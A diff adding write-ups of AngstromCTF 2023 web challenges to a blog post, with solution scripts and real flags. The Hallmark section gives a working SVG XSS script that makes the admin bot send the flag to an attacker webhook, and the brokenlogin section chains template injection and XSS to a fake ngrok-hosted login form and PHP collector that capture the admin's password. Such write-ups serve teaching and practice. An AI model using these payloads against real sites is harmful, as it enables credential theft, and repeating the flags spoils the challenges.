@@ -102,54 +102,558 @@ conn.close()
 ## catch me if you can
 
 > _Somebody help!_<br>
-> _https://xxxxx.actf.co/_
+> _https://catch-me-if-you-can.web.actf.co/_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+![catch me if you can](/assets/img/AngstromCTF_2023/catch-me-if-you-can.gif){: .image-66}
+
+Some text is spinning on the page and it seems to be the flag. Ok, let's dig into html source code. 
+
+```html
+<body>
+    <h1>catch me if you can!</h1>
+    <marquee scrollamount="50" id="flag">actf{REDACTED}</marquee>
+</body>
+```
+
+Yep, it was the flag. Quite straightforward.
+
+🏁 _actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}_{: .spoiler}
 
 ## Celeste Speedrunning Association
 
 > _I love Celeste Speedrunning so much!!! It's so funny to watch!!! Here's my favorite site!_<br>
-> _https://xxxxx.actf.co/_
+> _https://mount-tunnel.web.actf.co/_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+We have to beat other players by playing at Celeste speedrun game. The main page shows us the scoreboard. 
+
+```html
+Welcome to Celeste speedrun records!!!<br>
+Current record holders (beat them at <current URL>/play for a flag!):
+<ol>
+    <li>Old Lady: 0 seconds</li>
+    <li>Madeline: 10 seconds</li>
+    <li>Badeline: 10.1 seconds</li>
+</ol>
+```
+
+Looking at `/play` source code, we need to send a `start` value to `/submit` in order to play. 
+
+```html
+<form action="/submit" method="POST">
+    <input type="text" style="display: none;" value="1682636300.7767162" name="start" />
+    <input type="submit" value="Press when done!" />
+</form>
+```
+
+The goal is to click the button as fast as we can... or change the `start` value. We can turn it into the current timestamp and add a few seconds. This way our speedrun time will be negative. Easy win.
+
+```python
+import time
+import requests
+
+url = 'https://mount-tunnel.web.actf.co/submit'
+
+data = {
+    'start': time.time() + 5
+}
+
+r = requests.post(url, data=data)
+print(r.text)
+```
+
+🏁 _actf{wait_until_farewell_speedrun}_{: .spoiler}
 
 ## shortcircuit
 
 > _Bzzt_<br>
-> _https://xxxxx.actf.co/_
+> _https://shortcircuit.web.actf.co/_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+There's a simple login form on the main page. Looking at the html source code, we notice a JS script.
+
+```javascript
+const swap = (x) => {
+    let t = x[0]
+    x[0] = x[3]
+    x[3] = t
+
+    t = x[2]
+    x[2] = x[1]
+    x[1] = t
+
+    t = x[1]
+    x[1] = x[3]
+    x[3] = t
+
+    t = x[3]
+    x[3] = x[2]
+    x[2] = t
+
+    return x
+}
+
+const chunk = (x, n) => {
+    let ret = []
+
+    for(let i = 0; i < x.length; i+=n){
+        ret.push(x.substring(i,i+n))
+    }
+
+    return ret
+}
+
+const check = (e) => {
+    if (document.forms[0].username.value === "admin"){
+        if(swap(chunk(document.forms[0].password.value, 30)).join("") == "7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7"){
+            location.href="/win.html"
+        }
+        else{
+            document.getElementById("msg").style.display = "block"
+        }
+    }
+}
+```
+
+Seems like some characters of the flag have been swapped. Using a reverse swap function, we can retrieve it in its normal form and print it.
+
+```javascript
+const swap_rev = (x) => {
+    let t;
+
+    t = x[2]
+    x[2] = x[3]
+    x[3] = t
+
+    t = x[3]
+    x[3] = x[1]
+    x[1] = t
+
+    t = x[1]
+    x[1] = x[2]
+    x[2] = t
+
+    t = x[3]
+    x[3] = x[0]
+    x[0] = t
+
+    return x
+}
+
+const chunk = (x, n) => {
+    let ret = []
+
+    for(let i = 0; i < x.length; i+=n){
+        ret.push(x.substring(i,i+n))
+    }
+
+    return ret
+}
+
+let x = '7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7';
+let flag = swap_rev(chunk(x, 30)).join("");
+
+console.log(flag);
+```
+
+🏁 _actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}_{: .spoiler}
 
 ## directory
 
 > _This is one of the directories of all time, and I would definitely rate it out of 10._<br>
-> _https://xxxxx.actf.co/_
+> _https://directory.web.actf.co/_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+Searching through a 5000 list of html pages, the goal is to find the one where the flag is hidden.
+
+```html
+<html>
+    <body>
+        <a href="0.html">page 0</a><br />
+        <a href="1.html">page 1</a><br />
+        <a href="2.html">page 2</a><br />
+        <a href="3.html">page 3</a><br />
+        <a href="4.html">page 4</a><br />
+        <a href="5.html">page 5</a><br />
+        <a href="6.html">page 6</a><br />
+
+        <!-- [...] -->
+```
+
+A simple Python script can do this for us.
+
+```python
+import requests
+from pwn import *
+import time
+
+url = 'https://directory.web.actf.co/{}.html'
+p = log.progress('directory')
+
+for i in range(0, 5000):
+    r = requests.get(url.format(i))
+    out = r.text
+
+    p.status(f'{i}.html - {out}')
+
+    if 'your flag is in another file' not in out:
+        break
+
+    time.sleep(1)
+```
+
+🏁 _actf{y0u_f0und_me_b51d0cde76739fa3}_{: .spoiler}
 
 ## Celeste Tunnelling Association
 
 > _Welcome to the tunnels!! Have fun!_<br>
-> _https://xxxxx.tailxxxxx.ts.net/_<br>
+> _https://pioneer.tailec718.ts.net/_<br>
 > _Attachments: server.py_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+From `server.py`, we can see how the server works.
+
+```python
+# run via `uvicorn app:app --port 6000`
+import os
+
+SECRET_SITE = b"flag.local"
+FLAG = os.environ['FLAG']
+
+async def app(scope, receive, send):
+    headers = scope['headers']
+
+    # [...]
+
+    # IDK malformed requests or something
+    num_hosts = 0
+    for name, value in headers:
+        if name == b"host":
+            num_hosts += 1
+
+    if num_hosts == 1:
+        for name, value in headers:
+            if name == b"host" and value == SECRET_SITE:
+                await send({
+                    'type': 'http.response.body',
+                    'body': FLAG.encode(),
+                })
+                return
+
+    # [...]
+``` 
+
+If we set the `host` header to `flag.local`, we will retrieve the flag.
+
+```python
+import requests
+
+url = 'https://pioneer.tailec718.ts.net/'
+headers = {
+    'host': 'flag.local'
+}
+
+r = requests.get(url, headers=headers)
+print(r.text)
+```
+
+🏁 _actf{reaching_the_core__chapter_8}_{: .spoiler}
 
 ## Hallmark
 
 > _Send your loved ones a Hallmark card! Maybe even send one to the admin 😳._<br>
-> _https://xxxxx.actf.co/, https://xxxxx-bot.actf.co/hallmark_<br>
+> _https://hallmark.web.actf.co/, https://admin-bot.actf.co/hallmark_<br>
 > _Attachments: dist.tar.gz_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+Starting with the description of the challenge, we know what the goal is to create some cards and send them to the admin. There's the possibility to put images into them, choosing from a predefined list of 4. Otherwise, a custom text is accepted. Moreover, from app source code we see that `/flag` is accessible only from admin. XSS flavour around here, do you feel it?
+
+```javascript
+// the admin bot will be able to access this
+app.get("/flag", (req, res) => {
+    if (req.cookies && req.cookies.secret === secret) {
+        res.send(flag);
+    } else {
+        res.send("you can't view this >:(");
+    }
+});
+```
+
+From `/card` we can create new cards, edit or print them. The server sets the right `content-type` header to print a card based on its content, which can be text or a SVG image. 
+
+```javascript
+app.get("/card", (req, res) => {
+    if (req.query.id && cards[req.query.id]) {
+        res.setHeader("Content-Type", cards[req.query.id].type);
+        res.send(cards[req.query.id].content);
+    } else {
+        res.send("bad id");
+    }
+});
+```
+
+The first idea could be simply to create a card by putting some javascript code as custom text and submit the link to the admin. There's a problem: the response `content-type` header will be set to `text/plain`. Instead, if we set `svg` other than `text`, our custom text won't be considered at all.
+
+```javascript
+app.post("/card", (req, res) => {
+    let { svg, content } = req.body;
+
+    let type = "text/plain";
+    let id = v4();
+
+    if (svg === "text") {
+        type = "text/plain";
+        cards[id] = { type, content }
+    } else {
+        type = "image/svg+xml";
+        cards[id] = { type, content: IMAGES[svg] }
+    }
+
+    res.redirect("/card?id=" + id);
+});
+```
+
+Looking into card edit method, we can see a poorly constructed equality check: `type == "image/svg+xml"`.
+
+```javascript
+app.put("/card", (req, res) => {
+    let { id, type, svg, content } = req.body;
+
+    if (!id || !cards[id]){
+        res.send("bad id");
+        return;
+    }
+
+    cards[id].type = type == "image/svg+xml" ? type : "text/plain";
+    cards[id].content = type === "image/svg+xml" ? IMAGES[svg || "heart"] : content;
+});
+```
+
+Knowing that `type` attribute is used to set the `content-type` header and that
+JS is a beautiful language
+
+```javascript
+'test' == ['test']  //true
+'test' === ['test'] //false
+```
+
+we could try to create a new card and edit it by setting `type` to
+
+```plaintext
+['image/svg+xml']
+```
+
+and `content` to
+
+```xml
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+        alert(1);
+   </script>
+</svg>
+```
+
+This way we can inject custom SVG payload and run a JS script since `content-type` header will be `image/svg+xml`. Let's see if it can work. 
+
+![hallmarket XSS](/assets/img/AngstromCTF_2023/hallmark-xss.png){: .image-66}
+
+Ok, now we can create the real payload. The admin will do a request to `/flag` and will send the flag to us. We can use webhook to intercept the response. A final Python script could be
+
+```python
+import requests
+
+webhook = 'https://my-unique-webhook-url'
+print(f'#1: webhook: {webhook}')
+
+url = 'https://hallmark.web.actf.co/card'
+
+post_data = {
+    'svg': 'text',
+    'content': 'text' 
+}
+
+r = requests.post(url, data=post_data, allow_redirects=False)
+my_card_id = r.headers['Location'].split('=')[1]
+print(f'#2: id = {my_card_id}')
+
+content = '''
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+        var xmlHttp = new XMLHttpRequest();
+
+        xmlHttp.onreadystatechange = function() { 
+            if(xmlHttp.status == 200) {
+                flag = xmlHttp.responseText;
+                document.location = "''' + webhook + '''?p=" + flag;
+            }
+        }
+
+        xmlHttp.open("GET", '/flag', true);
+        xmlHttp.send();
+   </script>
+</svg>
+'''
+
+put_data = {
+    'id': my_card_id,
+    'type[]': ['image/svg+xml'],
+    'svg': '',
+    'content': content 
+}
+
+r = requests.put(url, data=put_data)
+
+if r.text == 'ok':
+    print(f'#3: Go to "https://admin-bot.actf.co/hallmark" and put "{url}?id={my_card_id}"')
+else:
+    print('Error')
+```
+
+🏁 _actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}_{: .spoiler}
 
 ## brokenlogin
 
 > _Talk about a garbage website... I don't think anybody's been able to log in yet! If you find something, make sure to let the admin know._<br>
-> _https://xxxxx.actf.co/, https://xxxxx-bot.actf.co/brokenlogin_<br>
+> _https://brokenlogin.web.actf.co/, https://admin-bot.actf.co/brokenlogin_<br>
 > _Attachments: app.py, brokenlogin.js_
 
-🏁 _<FLAG_HERE>_{: .spoiler}
+
+From `app.py` we know that `message` argument can be printed if we pass it to the main page, but only if its content is no longer than 25 characters. 
+
+```python
+# [...]
+
+indexPage = """
+<html>
+    <head>
+        <title>Broken Login</title>
+    </head>
+    <body>
+        <p style="color: red; fontSize: '28px';">%s</p>
+        <p>Number of failed logins: {% raw %} {{ fails }} {% endraw %}</p>
+        <form action="/" method="POST">
+            <label for="username">Username: </label>
+            <input id="username" type="text" name="username" /><br /><br />
+
+            <label for="password">Password: </label>
+            <input id="password" type="password" name="password" /><br /><br />
+
+            <input type="submit" />
+        </form>
+    </body>
+</html>
+"""
+
+@app.get("/")
+def index():
+    global fails
+    custom_message = ""
+
+    if "message" in request.args:
+        if len(request.args["message"]) >= 25:
+            return render_template_string(indexPage, fails=fails)
+        
+        custom_message = escape(request.args["message"])
+    
+    return render_template_string(indexPage % custom_message, fails=fails)
+
+# [...]
+```
+
+We can try to send a template injection to see if the web app is vulnerable, for example {% raw %} `{{7*3}}` {% endraw %}
+
+![brokenlogin injection](/assets/img/AngstromCTF_2023/brokenlogin-1.png){: .image-66}
+
+We can see a `21`, so `7*3` has been evaluated. Now, let's get into admin bot source code. The admin will load the page sended by the user (only if the url is from ctf domain) and fill out a form with username and the flag as password. 
+
+```javascript
+module.exports = {
+    /* [...] */
+
+    async execute(browser, url) {
+        /* [...] */
+
+        const page = await browser.newPage();
+        await page.goto(url);
+
+        await page.waitForSelector("input[name=username]");
+        
+        await page.$eval(
+          "input[name=username]",
+          (el) => (el.value = "admin")
+        );
+
+        await page.waitForSelector("input[name=password]");
+
+        await page.$eval(
+          "input[name=password]",
+          (el, password) => (el.value = password),
+          process.env.CHALL_BROKENLOGIN_FLAG
+        );
+
+        await page.click("input[type=submit]");
+
+        /* [...] */
+    },
+};
+```
+
+The idea could be to create a fake form hosted with ngrok and use the template injection to perform a javascript redirect to our fake form. Let's try to get an XSS injection. First, there are two main problems to solve: payload length under 25 chars and `message` escaping. We can pass a second argument to the page and call it from `message` argument to bypass payload length constraint and escaping. We can try with
+
+```plaintext
+p=<script>alert(1)</script>&message={% raw %}{{request.args.p}}{% endraw %}
+```
+
+Doesn't seem to work. The template engine escapes strings by default. We know that flask framework uses jinja2 as template engine, which has the `safe` keyword to disable escaping. Let's try with
+
+```plaintext
+p=<script>alert(1)</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
+```
+
+Now it works. Using the JS property `document.location`, we can create our final payload.
+
+```plaintext
+p=<script>document.location='http://my.ngrok.ip'</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
+```
+
+and then the link we will submit to the admin
+
+```plaintext
+https://brokenlogin.web.actf.co/?p=<script>document.location='http://my.ngrok.ip'</script>&message={% raw %}{{request.args.p|safe}}{% endraw %}
+```
+
+We can handle the flag with a simple `save.php` script
+
+```php
+<?php
+    $flag = $_POST['password'];
+    $myfile = fopen("flag.txt", "w") or die("Unable to open file!");
+
+    fwrite($myfile, $flag);
+    fclose($myfile);
+
+    echo "ok!";
+```
+
+which is executed after the submission of the fake form
+
+```html
+<html>
+    <head>
+        <title>Exploit</title>
+    </head>
+    <body>
+        <form action="save.php" method="POST">
+            <label for="username">Username: </label>
+            <input id="username" type="text" name="username" /><br /><br />
+
+            <label for="password">Password: </label>
+            <input id="password" type="password" name="password" /><br /><br />
+
+            <input type="submit" />
+        </form>
+    </body>
+</html>
+```
+
+🏁 _actf{adm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9}_{: .spoiler}
 
 # Crypto
 
